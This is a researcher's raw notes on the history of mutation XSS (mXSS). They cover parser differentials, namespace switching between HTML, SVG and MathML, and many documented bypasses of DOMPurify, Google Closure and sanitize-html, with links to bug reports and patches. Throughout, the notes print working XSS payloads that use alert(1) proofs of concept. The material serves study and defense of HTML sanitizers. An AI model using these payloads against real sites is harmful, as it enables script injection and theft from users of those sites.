
**MXSS Evolution and Timeline**

Note this a document which I created while working on the MXSS video series https://youtu.be/aczTceXp49U, its very raw just random thoughts added here, if you want anything to change. feel free to pr.

### **How Do HTML Sanitizers Work?**

Sanitizers are tools designed to filter harmful content from HTML, making it safe to insert into a webpage. The process involves several steps:

1. **Parsing:** The HTML content is parsed into a DOM tree on either the server or in the browser.
2. **Sanitization:** The sanitizer iterates through the DOM tree to remove dangerous or harmful content.
3. **Serialization:** After sanitizing, the DOM tree is serialized back into an HTML string.
4. **Re-parsing:** The serialized HTML is assigned to `innerHTML`, triggering another parsing process.
5. **Appending to Document:** The final, sanitized DOM tree is appended to the document.

However, despite these steps, sanitizers—especially server-side ones—can fail due to **parser differentials** between server and client. A server-side sanitizer might miss dangerous content that behaves differently when parsed by a browser. A typical example is when content is treated as RAWTEXT on the server but as active HTML in the browser.

### **Issue with Server-Side Sanitization: HTML Parser Differentials**

Server-side sanitization can introduce problems due to the differences in how HTML is parsed by the browser versus the server. Using the same parser for both sanitization and insertion is often recommended.

For example, with the sanitize-html library:

```js
var dirty = "<svg><style><img src=x onerror=alert(1)></style>";
var clean = sanitizeHtml(dirty, {
    allowedTags: sanitizeHtml.defaults.allowedTags.concat(['style', 'svg'])
});
```

In this case, sanitize-html does not remove the text inside the `<style>` tag, thinking it won’t be rendered as it’s RAWTEXT. However, the browser treats `<style>` inside an SVG differently, causing it to be parsed as HTML, and thus the malicious `<img>` tag is executed.

### **Earliest MXSS Exploit: Yosuke Hasegawa (2007)**

The earliest recorded instance of Mutation XSS was discovered by **Yosuke Hasegawa** in 2007. This vulnerability involved Internet Explorer and its handling of the `alt` attribute. Hasegawa noticed that an attribute with two backticks ("alt=``onerror=alert(1)``") caused IE to strip the quotes, leading to an XSS vulnerability. This became the first documented case of Mutation XSS.

*Payload:*

```html
<img src="x" alt="``onerror=alert(1)" />
```
Read more about this discovery on Hasegawa's blog [here](https://hasegawa.hatenablog.com/entries/2007/03/13).

### **MXSS from 2007 to 2013**

Between 2007 and 2013, various researchers, including **Mario Heiderich**, **LeverOne**, **Gareth Heyes**, explored and documented MXSS vulnerabilities. One notable case was Mario’s discovery in 2011 (Mozilla bug [650001](https://bugzilla.mozilla.org/show_bug.cgi?id=650001)) that showed how SVG content could trigger MXSS through `innerHTML` mutations. 

*Payload:*
```html
<!doctype html><svg><style>&lt;img src=x onerror=alert(1)&gt;<p>
```

The slackers group where lot of this stuff shared and I don't think it was called MXSS at that time: https://web.archive.org/web/20131110003021/http://sla.ckers.org/forum/list.php?2,page=1


### **Mario’s 2013 Paper: The InnerHTML Apocalypse**

In Mario’s paper, the attacker prepares an HTML or XML string that seems safe during the first parsing. However, upon insertion into the browser’s DOM using `innerHTML`, the browser mutates the string unpredictably. This mutated structure can allow the execution of JavaScript even after sanitization.

In Mario's 2013 talk at Hack in Paris titled *"The InnerHTML Apocalypse"*, he demonstrated how MXSS could bypass even the most well-secured applications through these mutations.

Learn more about his research [here](https://repo.zenk-security.com/Conferences/Hack%20in%20Paris%202013/The%20Inner%20HTML%20Apocalypse%20-%20How%20MXSS%20Attacks%20Change%20Everything%20We%20Believed%20to%20Know%20so%20Far.pdf).

Read his paper: [mXSS Attacks: 2013](https://cure53.de/fp170.pdf).

### **Gareth Heyes and MXSS (2012-2015)**

Gareth Heyes was another researcher involved in MXSS research. Gareth's tweets from that period document numerous payloads that triggered MXSS in IE:

- `<% a=%&gt&lt;iframe/onload=alert(1)//> #mxss IE<=9`
- `<%/z=%&gt&lt;p/onresize=alert(1)//>`


These tweets from 2014 [here](https://x.com/garethheyes/status/526796862100365314) and [here](https://x.com/garethheyes/status/529696573694160897) discuss the IE payloads and their effects.

### Gareth Edge MXSS 2018 and DOMPurify Bypass

**Payload:**  
```html
	<title>&lt/title&gt&ltimg&sol;src=&quot&quotonerror&equals;alert(1)&gt
```
**Description**  
**Edge just decodes entities inside title**  
	  
**Link**  
[**http://www.thespanner.co.uk/2018/07/29/bypassing-dompurify-with-mxss/**](http://www.thespanner.co.uk/2018/07/29/bypassing-dompurify-with-mxss/)



### Masato DOMPurify Closure  Bypass and Google XSS Feb 2019 

**Description:**  
In the browser's DOMParser API, the JavaScript is considered disabled, content inside the \<noscript\> tag is interpreted as RAWTEXT. So, When using DOMParser, everything inside \<noscript\> is treated as raw text. However, once inserted into the page with JavaScript enabled, the contents of the \<noscript\> tag are re-parsed and executed as HTML.

**Google XSS Payload: Closure sanitization bypass**  
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```
**Link to patch**:   
https://github.com/google/closure-library/commit/c79ab48e8e962fee57e68739c00e16b9934c0ffa

**Dompurify bypass Payload:**  
```js
> DOMPurify.sanitize("a<noscript><p id='</noscript><img src=x onerror=alert(1)>'></p></noscript>", {ADD_TAGS: ['noscript']});
< "a<noscript><p id="</noscript><img src=x onerror=alert(1)>"></p></noscript>
```

### Masato noembed MXSS in FF and Chrome Feb 2019

**Description:**  
	*Chrome decodes HTML entities inside \<noembed\> tags when it is parsed by DOMParser APIs.*   
	*Firefox decodes HTML entities inside \<noscript\> tags when it is parsed by DOMParser APIs.* 
**Payload:**  
```js
	> new DOMParser().parseFromString('A <noembed> B &lt;/noembed&gt; C &lt;img src=x onerror=alert(1)&gt;  D </noembed> E','text/html').body.innerHTML
< "A <noembed> B </noembed> C <img src=x onerror=alert(1)>  D </noembed> E"
A <noscript> B &lt;/noscript&gt; C &lt;img src=x onerror=alert(1)&gt; D </noscript> E
```
**Links:**  
	[https://issues.chromium.org/issues/40090296](https://issues.chromium.org/issues/40090296)  
	https://bugzilla.mozilla.org/show\_bug.cgi?id=1528997

 ### <svg></p> MXSS 2019 SecurityMB:

**Chrome bug:** https://issues.chromium.org/issues/40050167

**Switch:** SVG to HTML

**Payload:**
```html
	<svg></p><style><g title="</style><img src onerror=alert(1)>">
```
#### Description:
- `<svg><p>` gets parsed to: `<svg></svg><p></p>`
- However, interesting thing happens if you put closing tag `</p>` in `<svg>`:
- `<svg></p>` gets parsed to `<svg><p></p></svg>`.
- So now the opening `<p>` is within `<svg>` which means that it will get out eventually when it is written to the DOM tree.

**Links:**
- Spec bug: https://github.com/whatwg/html/issues/5113
- Chrome issue: https://issues.chromium.org/issues/40050167
- Blog: https://research.securitum.com/dompurify-bypass-using-mxss/

**Other variants:**
```html
<svg></p><textarea><title><style></textarea><img src=x onerror=alert(1)></style></title></svg>
or
<svg></p><textarea><desc><style></textarea><img src=x onerror=alert(1)></style></desc></svg>
<math></p><textarea><mi><style></textarea><img src=x onerror=alert(1)></mi></math>
```

### Namespace Switching MXSS SecurityMB 2020
**Payload**
```html
<form>
<math><mtext>
</form><form>
<mglyph>
<style></math><img src onerror=alert(1)>
```

**Description**
*HTML to SVG namespace Switch:* 
- The img tag ends up as a child of a style tag in the HTML namespace due to the presence of mtext during the first parsing stage. As a result, DOMPurify doesn't remove it. While this HTML isn’t immediately dangerous, it undergoes a mutation since form tags can't be nested in HTML. However, using a trick mentioned in the spec, it is possible to nest them during the first parsing stage. The parser mutates the form to conform to the spec.
- On the second pass, the nested form is removed, and the mglyph element ends up directly below the mtext, switching it to the MathML namespace. This also changes the style element to MathML. Since img tags are not allowed in foreign content (like MathML), it moves back to the HTML namespace and is eventually executed.

**Spec:** If the adjusted current node is a MathML text integration point and the token is a start tag whose tag name is neither "mglyph" nor "malignmark"
**Link:** https://html.spec.whatwg.org/multipage/parsing.html#tree-construction

**Links**
*https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/*

**Instead of style xmp can be used:**
```js
DOMPurify.sanitize('<form><math><mtext></form><form><mglyph><xmp><img src=x onerror=alert(1)>',{ADD_TAGS:['xmp']})
```

#### Multiple variations of the same root cause namespace confusion:
**Payload:**
```html
<math><mtext><table><mglyph><style><img src=x onerror="alert(1)"></table> or
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
```
**Description for why table behaves that way:**
*	Table tag has a parsing quirk called foster parenting, it moves the children if they are not allowed as children, so here mglyph style and img are all moved before the table

Other variant: 
```html
<math><mtext><a title='one'><audio>aa<altglyphdef><animatecolor><filter><fieldset><a title='two'></fieldset>ccd</a>gg<mglyph><svg><mtext><style><a title='</style><img src=# onerror=alert(1)>'>
```



### Important Points to consider from now on:

1. [Main Root cause of MXSS in client-side sanitize](https://html.spec.whatwg.org/multipage/parsing.html#serialising-html-fragments:escapingString-3:~:text=It%20is%20possible%20that%20the%20output,not%20return%20the%20original%20tree%20structure)r: *It is possible that the output of this algorithm, if parsed with an [HTML parser](https://html.spec.whatwg.org/multipage/parsing.html#html-parser), will not return the original tree structure. Tree structures that do not roundtrip a serialize and reparse step can also be produced by the [HTML parser](https://html.spec.whatwg.org/multipage/parsing.html#html-parser) itself, although such cases are typically non-conforming.*  

   

   *P(P(D))  ≠   P(D)*

   Actually it is Pn(D)   ≠  Pn−1(D) 

   

   Non-Idempotency: that repeated parsing yields different results after each pass. This captures the essence of mutation in the browser's parsing.

   P here is parsing, D is the HTML string

   

   Example:

   D​=\<form\>\<div\>\</form\>\<form\>\</div\>\</form\> 

   

   P(D)=\<form\>\<div\>\</form\>\<form\>\</div\>\</form\>\</form\> 

   

   P(P(D))=\<form\>\<div\>\</div\>\</form\> 

   

   

2. In the HTML namespace, children of a \<style\> \<xmp\>  tag are treated as RAWTEXT state or just text. However, in SVG and MathML namespaces, children of the \<style\> tag are treated as actual elements, which can cause different parsing behavior.  
3. Comments within a \<style\> tag are ignored in HTML, but in SVG and MathML, comments inside a \<style\> tag are not ignored and can affect how the content is parsed.  
4. HTML entities (like \&amp;) are decoded in SVG and MathML, potentially altering the content during parsing.  
5. In the case of tables, the parser uses a concept called "fostering parent," which moves unwanted or misplaced elements outside of the table and continues with the parsing, ensuring the table structure remains correct.  
6. The \<select\> tag actively removes any child elements that are not allowed, ensuring only valid content is retained.  
7. While HTML does not allow nested forms, during the first parsing pass, it's possible to have a structure like \<form\>\<div\>\</form\>\<form\>\</div\>\</form\>. However, in the next parsing pass, this will mutate to \<form\>\<div\>\</form\>\<form\>\</div\>\</form\>\</form\>, and eventually result in \<form\>\<div\>\</form\>. This behavior is part of how browsers ensure that the document follows the HTML specification, resolving nested form issues through mutation.  
8. Refere [https://sonarsource.github.io/mxss-cheatsheet/\#](https://sonarsource.github.io/mxss-cheatsheet/#) for more  
9. We have 3 main namespaces: html, svg, math  
10. **Switch**: In the first parsing, during sanitization, our payload that executes JavaScript exists in one namespace, making it appear as safe HTML. At this stage, the payload might be within style tag text content, as an attribute value, or even as a comment, none of which are directly executable. However, during the browser's second HTML parsing, the content shifts to another namespace. As this switch happens, the payload is transformed, causing it to move out of the text content, attribute value, or comment where it was originally contained. This allows the embedded JavaScript to eventually execute.  
    1. Example:  
       **Style tag HTML to MATH switch:**  
       **Payload:** ```<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)></style></mglyph></form></mtext></math></form>```


       **Parser in Sanitizer:**   
       This weird form case mutates and creates following: ```<form><math><mtext><form><mglyph><style><img src=x>```  \<- Notice it became nested forms  
       **Parser in innerHTML:**   
       As nested forms are not allowed inner form is removed making following html: ```<form><math><mtext><mglyp><style><img src=x onerror=x> ```   
       \
       

11. The goal is to exploit the non-idempotent nature of HTML parsing to fool sanitizers. In the first parsing, the HTML appears innocent, with potentially dangerous elements hidden in ways that the sanitizer won't detect, such as within comments, attributes, or using namespaces like MathML or SVG. The sanitizer allows the document through, seeing it as safe. However, during the second parsing by the browser, the structure mutates—elements might shift between namespaces or become reinterpreted—revealing malicious content that can execute JavaScript or other harmful code, bypassing the initial sanitization.

    **Or**

    P(D)=Dsafe \<- sanitization

    P(P(D))=Dmalicious \<- insertion to body

### Masato’s numerous bypasses when removing forbidden tags:

Description: DOMPurify removes certain tags but preserves the content inside them, which can be exploited for Mutation XSS (MXSS) through namespace switching. For example, the style tag resides inside the HTML namespace within a foreignObject element. DOMPurify removes the foreignObject tag but retains its content, causing the remaining content to switch to the SVG namespace. As a result, the malicious content that was initially safe in the HTML namespace now becomes executable as SVG tags, leading to the execution of the payload. This exploit leverages the way DOMPurify handles tag removal without completely removing the content inside. 

Similar variation to Securitymb <svg></p> but use a tag which gets removed by DOMpurify inbetween them like `<svg><foreignobject><p>` <- valid dom but after sanitization it turns `<svg><p>` <- not valid dom, so <p> kicks out

So, when content is not ignored and inserted to body, mxss can happen with below payloads

Payloads:
```html
	<svg><foreignobject><p><style><p title="</style><iframe onload&#x3d;alert(1)<!--"></style>
or

<math><annotation-xml encoding="text/html"><p><style><p title="</style><iframe onload&#x3d;alert(1)<!--"></style>

//<svg><p><style><p title="</style><iframe onload=alert(1)<!--"></p></style></p></svg>

DOMPurify.sanitize('<svg><title><p><style><p title="</style><iframe onload&#x3d;alert(1)<!--"></style>',{"FORBID_TAGS":["title"]})

<svg><foreignobject><b><style><p title="</style><iframe onload&#x3d;alert(1)<!--"></style>

DOMPurify.sanitize('<svg><desc><b><style><b title="</style><iframe onload&#x3d;alert(1)<!--"></style>',{"FORBID_TAGS":["desc"]})

DOMPurify.sanitize('<math><annotation-xml encoding="text/html"><style><img src=x onerror=alert(1)></style>',{"ADD_TAGS":['annotation-xml']})

DOMPurify.sanitize('<math><mi><b><style><b title="</style><iframe onload&#x3d;alert(1)<!--"></style>',{"FORBID_TAGS":["mi"]})

document.write(DOMPurify.sanitize("x<noframes><svg><b><xmp><b title='</xmp><img src=x onerror=alert(1)>'>",{ADD_TAGS:["xmp"]}))

<xmp><svg><b><style><b title='</style><img src=x onerror=alert(1)>'>
<noembed><svg><b><style><b title='</style><img src=x onerror=alert(1)>'>

<noframes><svg><b><style><b title='</style><img src=x onerror=alert(1)>'>

<plaintext><svg><b><style><b title='</style><img src=x onerror=alert(1)>'>

<iframe><svg><b><style><b title='</style><img src=x onerror=alert(1)>'>

```
**Fix by Dompurify for above issue:**
```js
/* Tags to ignore content of when KEEP_CONTENT is true */  <- Just remove contents too
const FORBID_CONTENTS = addToSet({}, [ 'annotation-xml', 'audio', 'colgroup', 'desc', 'foreignobject', 'head', 'math', 'mi', 'mn', 'mo', 'ms', 'mtext', 'script', 'style', 'template', 'thead', 'title', 'svg', 'video', ]);
```


### A similar masato’s above variation in recent version by kevin mizu restricted DOMPurify 3.0.8 2024
**Switch:** Style tag HTML to SVG
**Payload:**
```js
DOMPurify.sanitize(`<svg><annotation-xml><foreignobject><style><!--</style><p id="--><img src='x' onerror='alert(1)'>">`, {
    CUSTOM_ELEMENT_HANDLING: {
        tagNameCheck: /.*/
    },
    FORBID_CONTENTS: [""]
});
```

**Description:**
- The <annotation-xml> element is treated as a custom element due to the permissive custom element regex (tagNameCheck: /.*/). With FORBID_CONTENTS set to an empty array, both <annotation-xml> and <foreignobject> within the <svg> are considered valid and aren't removed by the namespace checks. However, DOMPurify later removes <foreignobject>, leaving its contents to be re-assigned as children of <annotation-xml> due forbid_contents set to empty. As a result, the <style> tag (which normally belongs to the HTML namespace) is now nested inside the SVG's <annotation-xml>, allowing it to be treated as SVG content.



### SVG to HTML switch:  Daniel Santos @bananabr
**Description:**
- Another variation of the SecurityMB exploit involves a different switch, converting the style tag from the SVG namespace into the HTML namespace. This version uses two mtext elements, with the second mtext ensuring that the payload to stay in the HTML namespace for first parsing *<mtext><style><x id="&lt;/style><img onerror=alert(1) src>">.*
- During the second parsing, when the form is removed, elements mtext > mglyph > svg > mtext will all be within the MathML namespace as mglyph child will be mathml until html namespace element comes. And the second mtext, the style tag transitions back into the HTML namespace, allowing the malicious code within the style tag to execute.


**Payload:** 
```html
<form><math><mtext></form><form><mglyph><svg><mtext><style><x id="&lt;/style><img onerror=alert(1) src>">
```

### Gareth: Switch MATHML style to HTML style added with comment trick
**Payload:**
```<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">```

**Description**:
- *1st Pass (P(D))*: During the first pass, the table moves(forstering parent) the mglyph element right beside the mtext, resulting in a structure like <math><mtext><mglyph>. At this stage, both mglyph and style are in the HTML namespace, so comments within the style tag are ignored, and HTML entities are decoded normally.
- *2nd Pass (P(P(D)))*: In the second parsing, mglyph is reinterpreted within the MathML namespace since it's adjacent to mtext. As a result, the style tag also switches to the MathML namespace. Now, in the MathML context, comments inside the style tag are no longer ignored. This causes the comment to be closed inside the title, and the hidden payload is executed.

#### Some other variant

*Switch: SVG style to HTML *

**Payload:**
```html
<math><mtext><a title='one'><audio>aa<altglyphdef><animatecolor><filter><fieldset><a title='two'></fieldset>ccd</a>gg<mglyph><svg><mtext><style><a title='</style><img src=# onerror=alert(1)>'>
```
**Description**: Since <a> tags cannot be nested, they are initially treated together but later become sibling elements. The second <a> tag brings subsequent <mglyph> elements as children of <mtext>. As a result, <mtext> initially inside a <style> tag is reinterpreted as MathML <mtext> because it becomes a child of an SVG's <mglyph>.


### By someone
**Switch: SVG style to HTML**
*Payload:*
```html
 <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><style><a title="</style><img src onerror='alert(1)'>"></style>
```
**Description:**
Since `<h>` tags (e.g., `<h1>`, `<h6>`) cannot be nested, they are separated and become sibling elements. In the first parse (P(D)), `<mtext>` is nested within an SVG, but in the second parse (P(P(D))), a mutation occurs where `<mglyph>` becomes a direct child of `<mtext>` (top). This causes the `<mtext>` (bottom), initially in SVG in P(D), to be reinterpreted as a MathML `<mtext>` in P(P(D)).



### Incorrect serialization of at-rules in CSS can lead to CSS injection - Google CTF by SecurityMB

Chromium serialization of CSS (using the cssText property on CSS rules) doesn't escape names of certain at-rules, such as `@keyframes` or `@layer`. Consider the following keyframes rule:
```@keyframes abc\{\} {}```
After getting the cssText of the rule, the rule is serialized to:
```@keyframes abc{} {}```

Links:
https://issues.chromium.org/issues/343000522
https://github.com/google/google-ctf/tree/main/2024/quals/web-in-the-shadows#intended-solution

###  3.1.0 DOMPurify Bypass with nesting by icesfont


TBD  after the part 1 video will update, this is banger of a bug




#### Some miscellaneous brainstorming
XMLSerializer.serializeToString(), like Google Closure lib or do a similar processing. ? Is it safe?
Note: insertAdjacentHTML is fragment parsing mode, for instance <svg><p> is allowed in fragment parsing mode but not document parsing mode, so if its parsed in fragment first then innerhtml u can mxss using initial securitymb `<svg></p><style><a id=”</style><img>”>`

Copypaste sanitizer mxss
https://bugs.chromium.org/p/chromium/issues/detail?id=1011950
https://bugs.chromium.org/p/chromium/issues/detail?id=1065761


Brainstorm:
Why build or use a spec complaint parser during sanitization

Why not use a parser that doesn’t mutate anymore.

P(P(D)) =/ P(D)
P(P(D)) = P(D)

<img width="1018" alt="image" src="https://github.com/user-attachments/assets/3a4c6abc-3cd2-481c-8f60-5c2093686a49">

#### some misc links
https://research.securitum.com/dompurify-bypass-using-mxss/

https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/

https://sonarsource.github.io/mxss-cheatsheet/

https://cure53.de/fp170.pdf

https://2021.swisscyberstorm.com/2021/10/17/Mario_Heiderich_-_mXSS_in_2021_One_long_solved_problem.pdf

http://www.webkit.org/projects/layout/index.html

https://web.dev/articles/howbrowserswork

https://www.youtube.com/watch?v=QBkLI35sxVs

https://aszx87410.github.io/beyond-xss/en/ch2/mutation-xss/

https://issues.chromium.org/issues/40050167#c_ts1574850321 : spec bug

http://software.hixie.ch/utilities/js/live-dom-viewer/?saved=7497

https://html.spec.whatwg.org/multipage/parsing.html#misnested-tags:-b-i-/b-/i




